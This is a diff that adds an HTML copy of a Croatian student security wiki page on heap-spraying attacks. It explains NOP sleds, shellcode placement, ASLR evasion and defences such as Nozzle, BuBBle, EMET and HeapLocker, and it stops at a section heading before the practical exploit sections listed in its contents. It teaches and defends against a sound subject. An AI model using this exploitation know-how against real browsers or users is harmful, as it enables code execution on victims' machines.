@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Heap Spraying - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Heap_Spraying&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Heap_Spraying skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Heap Spraying</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Heap_Spraying.html#mw-head">orijentacija</a>,
+					<a href="Heap_Spraying.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p><b>Članovi tima:</b> Matej Piknjač, Saša Čalopek, Davor Lisjak
+</p><p><br />
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Heap_Spraying.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a>
+<ul>
+<li class="toclevel-2 tocsection-2"><a href="Heap_Spraying.html#Slabosti"><span class="tocnumber">1.1</span> <span class="toctext">Slabosti</span></a></li>
+<li class="toclevel-2 tocsection-3"><a href="Heap_Spraying.html#Povijest"><span class="tocnumber">1.2</span> <span class="toctext">Povijest</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-4"><a href="Heap_Spraying.html#Strukture"><span class="tocnumber">2</span> <span class="toctext">Strukture</span></a>
+<ul>
+<li class="toclevel-2 tocsection-5"><a href="Heap_Spraying.html#Stog"><span class="tocnumber">2.1</span> <span class="toctext">Stog</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="Heap_Spraying.html#Hrpa"><span class="tocnumber">2.2</span> <span class="toctext">Hrpa</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-7"><a href="Heap_Spraying.html#Preljevi_me.C4.91uspremnika_baziranog_na_hrpi"><span class="tocnumber">3</span> <span class="toctext">Preljevi međuspremnika baziranog na hrpi</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Heap_Spraying.html#Heap_Spraying_napadi"><span class="tocnumber">4</span> <span class="toctext">Heap Spraying napadi</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Heap_Spraying.html#Za.C5.A1tite_od_heap_spraying_napada"><span class="tocnumber">5</span> <span class="toctext">Zaštite od heap spraying napada</span></a>
+<ul>
+<li class="toclevel-2 tocsection-10"><a href="Heap_Spraying.html#Nozzle_.28Raspr.C5.A1iva.C4.8D.29"><span class="tocnumber">5.1</span> <span class="toctext">Nozzle (Raspršivač)</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="Heap_Spraying.html#BuBBle"><span class="tocnumber">5.2</span> <span class="toctext">BuBBle</span></a></li>
+<li class="toclevel-2 tocsection-12"><a href="Heap_Spraying.html#EMET"><span class="tocnumber">5.3</span> <span class="toctext">EMET</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="Heap_Spraying.html#HeapLocker"><span class="tocnumber">5.4</span> <span class="toctext">HeapLocker</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="Heap_Spraying.html#Detekcija_malicioznog_koda"><span class="tocnumber">5.5</span> <span class="toctext">Detekcija malicioznog koda</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="Heap_Spraying.html#Data_Execution_Prevention_.28Prevencija_izvr.C5.A1avanja.29"><span class="tocnumber">5.6</span> <span class="toctext">Data Execution Prevention (Prevencija izvršavanja)</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="Heap_Spraying.html#Rastavljanje_i_replikacija_informacija"><span class="tocnumber">5.7</span> <span class="toctext">Rastavljanje i replikacija informacija</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-17"><a href="Heap_Spraying.html#Malo_prakti.C4.8Dni_dio"><span class="tocnumber">6</span> <span class="toctext">Malo praktični dio</span></a>
+<ul>
+<li class="toclevel-2 tocsection-18"><a href="Heap_Spraying.html#Radna_okolina_-_OS.2C_software.2C_..."><span class="tocnumber">6.1</span> <span class="toctext">Radna okolina - OS, software, ...</span></a></li>
+<li class="toclevel-2 tocsection-19"><a href="Heap_Spraying.html#Alokacija_memorije"><span class="tocnumber">6.2</span> <span class="toctext">Alokacija memorije</span></a></li>
+<li class="toclevel-2 tocsection-20"><a href="Heap_Spraying.html#Osnovna_skripta"><span class="tocnumber">6.3</span> <span class="toctext">Osnovna skripta</span></a></li>
+<li class="toclevel-2 tocsection-21"><a href="Heap_Spraying.html#.C4.8Cesto_kori.C5.A1tena_skripta"><span class="tocnumber">6.4</span> <span class="toctext">Često korištena skripta</span></a></li>
+<li class="toclevel-2 tocsection-22"><a href="Heap_Spraying.html#Exploit"><span class="tocnumber">6.5</span> <span class="toctext">Exploit</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-23"><a href="Heap_Spraying.html#Literatura"><span class="tocnumber">7</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p>U današnje vrijeme gotovo da i nema osobe koja nije na neki način pretraživala Internet. Veoma ubrzani rast korisnika pretraživača weba u proteklim godinama rezultirao je i razvojem samih pretraživača, tako da ti pretraživači u današnje vrijeme imaju vrlo bogatu okolinu, koja, naravno, omogućuje web developerima razvijanje tehnički zahtjevnih aplikacija kakve se  nalaze na svim posjećenijim web stranicama.
+</p><p>Međutim, takva bogata okolina web pretraživača također omogućuje mnogobrojne probleme vezane uz sigurnost, poput „Cross site scripting“ (XSS) ili „Cross site request forgery“ (CSRF)napada .
+Većina današnjih web pretraživača je pisana velikim djelom u C ili C++ programskom jeziku, što oh čini ranjivima na  razne slabosti koje se pojavljuju u programima pisanim u tim jezicima. To su ranjivosti poput preljeva međuspremnika, reference na apolutni pokazivač…
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 13:26, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Slabosti">Slabosti</span></h3>
+<p>Najčešće iskorištena slabost kod C baziranih aplikacija je preljev međuspremnika stoga.
+U toj vrsti napada napadač koristi preljev međuspremnika u polju, tako da piše kod izvan granica memorije koja je alocirana za to polje, čime prepisuje narednu lokaciju u memoriji. Ako napadači imaju mogućnost prepisivanja povratne adrese ili drugačijeg tipa pokazivača, tada dobivaju kontrolu nad tokom izvođenja programa, što im omogućuje da ga preusmjere na svoj, prethodno ubačeni kod.
+</p><p>Iako su te slabosti još uvijek vrlo izražene u programima napisanima u C programskom jeziku, sve teže ih je iskoristiti zbog primjene raznih protumjera. Cilj tih protumjera je zaštititi područja od potencijalnog interesa za napadače tako da ne mogu biti mjenjana ili spriječavaju napadača da otkrije gdje se u memoriji nalazi njegov ubačeni kod, čime se sprječava preusmjeravanje toka programa na lokaciju u memoriji na koju je napadač prethodno ubacio svoj kod. Iz tih su se razloga napadi preusmjerili na da drugačije tipove sigurnonosnih slabosti.
+</p><p>Jedna od tih slabosti je i preljev međuspremnika temeljenog na hrpi. Ipak, zbog razloga što se hrpa neprestano mjenja, takvu vrstu slabosti je izrazito teško iskoristiti, posebno kod web pretraživača, kod kojih hrpa može izgledati potpuno drugčije, što ovisi o web stranicama i o tome koliko je njih korisnik web pretraživača pregledao. Iz tog razloga napadač ne može odrediti gdje će se u hrpi nalaziti preljev, pa on iz toga ne može saznati gdje se nalazi njegov ubačeni kod.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 13:26, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Povijest"> Povijest </span></h3>
+<p>Heap spraying je prilično dugo na sceni. Prvotno je dokumentiran od strane hakera Skylined. Prema Wikipedii, prvi javni napad korištenjem heap spraying metode je otkriven u 2001. godini. Skylined je upotrijebio tu metodu te tako iskoristio slabost kod Internet Explorer web browsera. Sve do danas, ta je metoda ostala broj 1 kod metoda za ubacivanje koda kod slabosti web browsera. Iako je uloženo puno truda u detekciju i prevenciju te slabosti, ona postoji i danas. Načini ubacivanja koda su se možda promjenili kroz vrijeme, ali osnovna ideja je ostala ista.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 18:37, 17. siječnja 2013. (CET)
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Strukture"> Strukture </span></h2>
+<h3> <span class="mw-headline" id="Stog">Stog</span></h3>
+<p>Svaka dretva u aplikaciji ima svoj stog. Da se podsjetimo, dretva je skup instrukcija u izvođenju. Stog  je apstraktni tip podataka. Stog radi po LIFO principu, što znači "zadnji unutra, prvi van", te ne zahtijeva puno upravljanja. Operacije koje se izvode nad stogom su push, koji služi za dodavanje elemenata u stog, te pop, koji služi za uzimanje elemenata iz stoga(slika1). Obično se koristi za pohranjivanje lokalnih varijabli, pokazivača na podatke, funkcije i objekte, argumente funkcija, rukovatelja iznimkama... Obično je fiksne veličine, a ona se definira kod pokretanja aplikacije, ili kod kreiranja nove dretve u aplikaciji. Ukoliko je stog pun, te nema dovoljno kapaciteta da primi nove elemente, tada se smatra da je došlo do preljeva stoga.
+</p><p><br />
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Stog_d.png" class="image"><img alt="Stog d.png" src="../images/8/84/Stog_d.png" width="352" height="253" /></a>
+</p><p>Slika 1: Jednostavna shema stoga, <a href="http://upload.wikimedia.org/wikipedia/commons/2/29/Data_stack.svg" class="external text" rel="nofollow">izvor</a>
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 11:09, 20. siječnja 2013. (CET)
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Hrpa">Hrpa</span></h3>
+<p>Hrpa je specijalizirani tip podataka, temeljena na stablima. Ona mora zadovoljavati svojstvo hrpe, koje glasi: ako je čvor A roditelj od čvora B, tada je ključ od čvora A nadređen ključu od čvora B, takav odnos se prenosi preko cijele hrpe. Ključ roditelja može biti ili veći ili jednak ključe djece (maksimalna hrpa, slika 2), u toj vrsti hrpe korijenski element ima najveći ključ u hrpi, ili roditelj može biti manji ili jednak ključe djece (minimalna hrpa), tada korijenski element ima najmanji ključ u hrpi. Na slici 2 je  vidljivo da između čvorova „braće“ ili „bratića“ nema nikakvog uređenja niti slijeda, kao kod nekih drugih vrsta stabla. Broj djece koju svaki čvor hrpe može imati ovisi o samoj vrsti hrpe. Poznata je binarna hrpa koja dozvoljava maksimalno dvoje djece po čvoru.
+</p><p>Hrpa je osmišljena da bi zadovoljavala zahtjeve dinamičke alokacije memorije. Veoma je korisna u situacijama kada se prije pokretanja nezna koliko će podataka dretva primiti ili koliko će podataka procesuirati.
+</p><p><br />
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Max_heap.png" class="image"><img alt="Max heap.png" src="../images/8/80/Max_heap.png" width="451" height="334" /></a>
+</p><p>Slika 2: Primjer binarne maksimalne hrpe, <a href="http://upload.wikimedia.org/wikipedia/commons/3/38/Max-Heap.svg" class="external text" rel="nofollow">izvor</a>
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 11:36, 20. siječnja 2013. (CET)
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Preljevi_me.C4.91uspremnika_baziranog_na_hrpi"> Preljevi međuspremnika baziranog na hrpi </span></h2>
+<p>Glavni cilj „heap spray“ napada je ubaciti maliciozni kod u memoriju te preusmjeriti tok programa na tak kod čime se pokreće napad. Napadi temeljeni na „heap spray“ filozofiji se smatraju posebnim vrstom napada temeljenih na hrpi iz razloga što zahtijevaju korupciju memorije. Iskoristive slabosti za takvu vrstu napada koriste dinamički alociranu memoriju. Neki generalni način za iskorištavanje preljeva međuspremnika baziranog na hrpi je prepisivanje informacija o upravljanju koje alokator memorije sprema u podatke.
+</p><p>Alokatori memorije rade na takvom principu da podatke spremaju u memoriju u komadima. Ti komadi se nalaze u dvostruko povezanoj listi, te sadrže informacije o upravljanju memorijom i stvarne podatke. Mnogi alokatori mogu biti napadani na način da im se prepišu djelovi koji sadrže informacije o upravljanju memorijom. Pošto je memorija temeljena na hrpi puno manje predvidljiva od stoga, teže je napadaču predvidjeti adresu u memoriji na kojoj se nalazi njegov ubačeni kod.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 18:54, 17. siječnja 2013. (CET)
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Heap_Spraying_napadi"> Heap Spraying napadi </span></h2>
+<p>Za zaštitu od napada preko slabosti uzrokovanih preljevom međuspremnika razvijene su razne protumjere, poput „Address Space Layout Randomization“ (ASLR). Ona funkcionira tako da slučajnim odabirom dodjeljuje prostor u adresnom prostoru procesa. Takvo dodjeljivanje adresnog prostora bi trebalo spriječiti napadače da jednostavno predvide adrese u adresnom prostoru procesa.
+</p><p>Heap spraying je razvijen tako da može bez problema zaobići protumjere koje su razvijene za zaštitu od slabosti preljeva međuspremnika, poput „Address Space Layout Randomization“ (ASLR ). On  funkcionira na takav način da povećava mogućnost da napadačev ubačeni kod završi na njemu željenoj adresi u memoriji. Izvodi se tako da da se hrpa popuni velikim brojem objekata koji sadrže napadačev ubačeni kod. Zbog toga se napad naziva sprejanjem hrpe. Taj postupak punjenja (sprejanja) povećava mogućnost uspjeha napada te ga također pojednostavljuje. Iako se o toj vrsti napada ne piše puno, te je ona i prilično nepoznata, veliki broj napada je izvršen upravo sa tom tehnikom.
+</p><p>Heap spraying napad povećava vjerojatnost skoka na ubačeni kod (shellcode). Da bi se to postiglo, napravljen je osnovni blok sa instrukcijama koje efektivno ne rade ništa, a naziva se NOP – „No Operation Performed“. Veličina tog bloka se povećava sa pridodavanjem „appending“ sadržaja bloka samom sebi, čime se tvori tzv. „NOP sled“, što bi se na Hrvatskom jeziku moglo tumačiti kao posmak blokova sa operacijama koje ne rade ništa&#160;:). Na kraju se dodaje ubačeni kod, tj. „shellcode“. Na taj način se zauzima podosta memorijskog prostora, čime se postiže da u slučaju da se dogodi skok toka programa na bilo koji dio NOP sleda, tok programa se preusmjerava preko NOP blokova na sam ubačeni kod napdača (shellcode). Ukoliko je veći NOP sled veća je mogućnost da će napad biti uspješan. Shema je vidljiva na slici 3.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:NOPsled.png" class="image"><img alt="NOPsled.png" src="../images/5/5d/NOPsled.png" width="309" height="347" /></a>
+</p><p>Slika 3: NOP blok i ubačeni kod pridodani u jedan maliciozni  objekt,<a href="https://lirias.kuleuven.be/bitstream/123456789/265421/1/fulltext.pdf" class="external text" rel="nofollow">link,str.3 </a> 
+</p><p>Druga faza napada sastoji se od punjenja hrpe web browsera sa velikim brojem „NOP sledova“, korištenjem konstrukata koji su omogućeni skriptnim jezikom koji je podržan od strane web browsera. Na slici 4 je vidljiva shema napada heap spraying metodom tijekom punjenja hrpe. Napad se pokreće korupcijom memorije. Ona može omogućiti napadaču da skoči na proizvoljno mjesto u memoriji. Napad se oslanja na vjerojatnost da će skok završiti u jednom od malicioznih objekata.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heap_spraying.png" class="image"><img alt="Heap spraying.png" src="../images/d/d0/Heap_spraying.png" width="734" height="368" /></a>
+</p><p>Slika 4: Heap spraying napad: hrpa je dopunjena objektima koji sadrže NOP blokove i kod,<a href="https://lirias.kuleuven.be/bitstream/123456789/265421/1/fulltext.pdf" class="external text" rel="nofollow">link,str.4</a>
+</p><p>Iako se ovdje prvenstveno posvećujemo web browserima, ova vrsta napada je izvediva na svim procesima koji dozvoljavaju korisnicima da alociraju objekte u memoriji. Primjer takvog napada je slabost kod Adobe Reader programa, kod kojih maliciozna .pdf datoteka može biti korištena za izvršavanje proizvoljnog programskog koda.
+Heap spraying napad se smatra neobičnim napadom na siguronosnu slabost, iz razloga što se „sprejanje hrpe“ smatra legalnom radnjom, te je dozvoljeno od strane aplikacija.
+</p><p>Web stranice koje koriste AJAX (Asynchronous Javascript And XML) tehnologiju, a to su u današnje vrijeme skoro sve, koriste heap spraying kao regularnu operaciju. Pošto protumjere za sprečavanje iskorištavanja te slabosti ne smiju aplikaciji onemogućiti alociranje memorije, detekcija heap sprayinga predstavlja veoma velik problem.
+</p><p>Struktura hrpe uvelike ovisi o broju alociranja i solobađanja memorije koje je izvela aplikacija prije napada heap spraying-om, te to predstavlja veliki problem napadaču koji želi pokrenuti svoj ubačeni kod bez da zna kako je uređen sadržaj hrpe. Možemo pretpostaviti da se onda napad svodi na pogađanje adrese na koji je ubačen maliciozni dio. No, korištenjem skriptnih programskih jezika koji se izvršavaju na strani korisnika, poput Javascripta, moguće je konstruirati idealne okolnosti za takav napad i posložiti hrpu tako da njezina struktura odgovara napadaču.
+Slika 5 Prikazuje tipični heap spraying napad u Javascriptu:
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Code_snipet.png" class="image"><img alt="Code snipet.png" src="../images/2/24/Code_snipet.png" width="392" height="248" /></a>
+</p><p>Slika 5: Javascript programski kod koji izvodi osnovni heap spraying napad, obično je pridodan u HTML web stranicu,<a href="https://lirias.kuleuven.be/bitstream/123456789/265421/1/fulltext.pdf" class="external text" rel="nofollow">link,str.5</a>
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 18:34, 18. siječnja 2013. (CET)
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Za.C5.A1tite_od_heap_spraying_napada"> Zaštite od heap spraying napada </span></h2>
+<p>mjere zaštite preuzete sa <a href="https://lirias.kuleuven.be/bitstream/123456789/265421/1/fulltext.pdf" class="external text" rel="nofollow">BuBBle: A Javascript Engine Level Countermeasure against Heap-Spraying Attacks</a>
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Nozzle_.28Raspr.C5.A1iva.C4.8D.29">Nozzle (Raspršivač)</span></h3>
+<p>Prva protumjera koja je dizajnirana za zaštitu od heap spraying napada na web browserima se na naziva „Nozzle“, na hrvatskom raspršivač. Koristi emulacijske tehnike za detekciju prisutnosti malicioznog koda. To se postiže analizom sadržaja svakog objekta alociranog od strane web browsera. U pravilu je ta protumjera implementirana na nivou alokatora memorije. Ta protumjera štiti od napada od heap spraying napada izvedenog sa bilo kojim skrpitnim jezikom podržanim od strane web browsera. Svaki blok u hrpi se rastavlja i konstruira se graf kontrole toka na temelju dekodiranih instrukcija. Pomoću tog pristupa se maliciozni blok lako detektira jer je vidljivo na grafu kontrole toka da jedan dio bloka (ubačeni kod) može biti dostupan na više načina – tj. iz više NOP objekata. Računa se vjerojatnost skoka unutar istog objekta za svaki objekt u hrpi.
+</p><p>Međutim, ta protumjera provjerava objekte u određenim intervalima, te stoga napadači mogu iskoristiti tzv. TOCTOU (Time-Of-Check-Time-Of-Use) slabost. Ona funkcioniran na način da napadač najprije alocira dobročudni objekt, pričeka Nozzle protumjera da ispita taj objekt, nakon toga promjeni sadržaj objekta u maliciozni kod, i pokrene napad.
+</p><p>Slabost te protumjere se također očituje u tome da ona ne provjerava cijelu hrpu, već samo neke poddjelove hrpe, zbog performansi. Provjera cijele hrpe je neprihvatljiva jer bi predugo trajala. Nozzle predpostavlja da heap spraying alocira relativno mali broj velikih objekata, stoga dizajn baziran na toj pretpostavci ne zaštićuje od napada koji alociraju veliki broj malih objekata, a oni imaju istu vjerojatnost za uspjeh.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mapiknjac&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mapiknjac (stranica ne postoji)">mapiknjac</a> 11:17, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="BuBBle">BuBBle</span></h3>
+<p>Heap spraying napadi oslanjaju se na to što se očekuje da veliki dijelovi memorije sadrže iste informacije (tj.Nop-shellcode) i to da gdje god unutar nopsleda "sleti" shellcode će se izvršiti. BuBBle štiti tako da dodaje raznolikost na hrpu što otežava heap spraying napade. Umeću se posebne prekidajuće vrijednosti u stringove na nasumičnim pozicijama kada se oni upisuju u memoriju, a uklanjaju se kada aplikacija koristi te stringove. Te vrijednosti uzrokuju program da izbaci exception kada budu izvršene kao instrukcije te tako onemogućuju napadača da se oslanja na to da je nopsled ili shellcode netaknut. Kako napadač ne bi pokušao na slijepo pogoditi gdje se nalaze zaštite te ih preskočiti, one se postavljaju nasumično.
+BuBBle implementira taj koncept u Javascript enginu Firefoxa. Prekidanje se regulira parametrom koji se može birati u build time-u browsera. BuBBle koristi 25 bajta, to je najmanji korisni shellcode kojeg su pronašli. <a href="http://packetstormsecurity.com/shellcode/25bytes-execve.txt" class="external text" rel="nofollow">shellcode</a>. To postavlja interval prema kojem se dodaju prekidajuće vrijednosti. Dakle, broj intervala se računa kao duljina stringa u bajtovima podijeljeno s 25 te zaokruženo na više. Za svaki interval bira se nasumična vrijednost koja predstavlja poziciju unutar stringa koja bude modificirana. Parametar označuje veličinu intervala odnosno koliko će se pozicija modificirati u jednom stringu. Udaljenost između dvije susjedne pozicije može biti veća od 25 ako jedna pozicija bude bliže početku intervala a sljedeća negdje na kraju svog intervala što znači da je moguće smjestiti najmanji shellcode između njih. Međutim, heap spraying napadi su bazirani na velikim količinama homogenih podataka, a ne samo na ubacivanju shellcode-a. Kada se znakovi na nasumičnim pozicijama promijene, potporna podatkovna struktura se puni s metapodacima kako bi se pratile originalne vrijednosti i pozicija gdje su one zapisane u stringu. Modificirani string se zapisuje u memoriju, a prilikom korištenja stringa, engine izvršava inverznu funkciju kako bi se vratila prava vrijednost stringa. To se postiže čitanjem metapodataka iz podatkovne strukture vezane za trenutni Javascript string i zamjenom prekidajućih vrijednosti originalnima s kopije sadržaja sa stringa. Svaka varijabla stringa ostane modificirana tako dugo dok je u memoriji i njezina kopija se vraća u izvornu vrijednost kada aplikacija zatražuje pristup tome stringu. Nakon što funkcija aplikacije obradi string, novi string se ponovo štiti.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Dalisjak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Dalisjak (stranica ne postoji)">Dalisjak</a> 18:41, 20. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="EMET">EMET</span></h3>
+<p>Enhanced Mitigation Experience Toolkit je aplikacija koja čuva od iskorištavanja ranjivosti u software-u. To čini koristeći posebne tehnologije koje služe kao posebne zaštite i prepreke koje napadač mora prebroditi kako bi mogao iskorištavati ranjivosti software-a. Te mjere ne garantiraju sigurnost, ali čine iskorištavanje ranjivosti koliko najviše mogu teško. U mnogo slučajeva se potpuno funkcionalna ranjivost koja bi mogla zaobići EMET neće nikada izraditi.
+EMET prealocira određene "popularne" regije u memoriji. Ako su lokacije kao što su 0a0a0a0a ili 0c0c0c0c već alocirane, heap spray će raditi ali ta lokacija ne bi sadržavala korisnikove podatke pa skakanje u nju nema previše smisla.
+EMET je dizajniran da radi s bilo kojim softwareom, nevezano kada i tko ga je napisao, međutim postoje iznimke. Neke aplikacije se oslanjaju na ponašanje sustava koje EMET blokira stoga je potrebno testirati na računalima koristeći testne scenarije. Ako postoji problem sa specifičnom mitigacijom, one se mogu pojedinačno uključiti/isključiti.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Dalisjak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Dalisjak (stranica ne postoji)">Dalisjak</a> 18:54, 20. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="HeapLocker">HeapLocker</span></h3>
+<p>HeapLocker je open source alat za smanjivanje heap spray napada. Kada se dogodi napad heap sprayem, alokacija virtualne memorije naglo poraste. Ovaj alat omogućuje postavljanje maksimalne količine virtualne memorije koju neki proces koristi. U slučaju prekoračenja, alat zaustavlja(suspendira) proces i pop-upom informira korisnika o prekoračenju. Postavljanjem HeapLockera (alat je u obliku dll-a) unutar neke aplikacije, on provjerava postavljenu vrijednost za maksimalnu količinu memorije te pokreće novu dretvu unutar procesa aplikacije. Ta dretva se budi svake sekunde i provjerava količinu memorije koje je proces alocirao. Ako veličina prekoračuje zadano ograničenje, dretva će zaustaviti ostale dretve tog procesa i prikazati poruku korisniku.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heaplocker_2.png" class="image"><img alt="Heaplocker 2.png" src="../images/1/12/Heaplocker_2.png" width="480" height="331" /></a> 
+</p><p>Korisnik može odlučiti da ubije proces ili da ga nastavi koristiti. U slučaju nastavka korištenja, alat će odblokirati odnosno resume-ati ostale dretve procesa te će ga prestati provjeravati sve dok je taj proces živ. Dakle, bilo bi mudro restartati aplikaciju ako korisnik ima namjeru otvarati druge dokumente. Moguće je isključiti ovu mogućnost u registry-u tako da automatski ubija procese u slučaju prekoračenja. HeapLocker je također kompatibilan sa EMET-om.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heaplocker_1.png" class="image"><img alt="Heaplocker 1.png" src="../images/7/7c/Heaplocker_1.png" width="339" height="142" /></a>
+</p><p>Druga tehnika zaštite koja je implementirana u HeapLockeru je nopsled detekcija. Alat kreira novu dretvu koja svake sekunde provjerava nove virtualne stranice koje se mogu čitati i po njima pisati. Kada je nopsled duži ili jednak postavljenom minimalnoj duljini detektiran unutar tih stranica, alat će zaustaviti sve dretve osim vlastite i upozoriti korisnika o nopsled-u. Instrukcije koje se sastoje od jednog byte-a i heaplocker ih prepoznaje možete vidjeti <a href="http://web.vip.hr/nail.vip/nopsleddetection.txt" class="external text" rel="nofollow">ovdje</a>. Moguće je da se nopsled prekasno pronađe, to jest da se shellcode već izvršio, ili da prerano skenira stranicu, odnosno prije nego nopsled bude zapisan u nju.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heaplocker_4.png" class="image"><img alt="Heaplocker 4.png" src="../images/2/29/Heaplocker_4.png" width="363" height="201" /></a>
+</p><p>Treća tehnika zaštite koja je implementirana u HeapLockeru je detekcija stringova. Alat kreira novu dretvu koja svake sekunde provjerava nove virtualne stranice koje se mogu čitati i po njima pisati. Kada specifični string bude pronađen unutar stranica,  alat će zaustaviti sve dretve osim vlastite i upozoriti korisnika da je string pronađen. String "unescape" mora se nalaziti iza znaka jednako ili ispred lijeve zagrade. Metoda nije potpuno pouzdana jer je moguće da alat skenira stranicu prije nego što je zapisan "unescape" string u nju.
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Heaplocker_3.png" class="image"><img alt="Heaplocker 3.png" src="../images/4/49/Heaplocker_3.png" width="459" height="188" /></a>
+</p><p>HeapLocker, poput EMETa, može također pred-alocirati memorijske stranice tako da se one ne mogu koristiti za heap spray pošto neće moći injicirati shellcode na zaštićene adrese. Za razliku od EMET-a, ovaj alat ima dva načina pred-alociranja. Prvi je način identičan EMETovom, a drugi način zapisuje posebni shellcode na pred-alocirane stranice koji u slučaju da se pokrene radi ranjivosti, poziva HeapLocker da zaustavi sve dretve i prikazuje upozorenje. 
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Dalisjak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Dalisjak (stranica ne postoji)">Dalisjak</a> 18:54, 20. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Detekcija_malicioznog_koda">Detekcija malicioznog koda</span></h3>
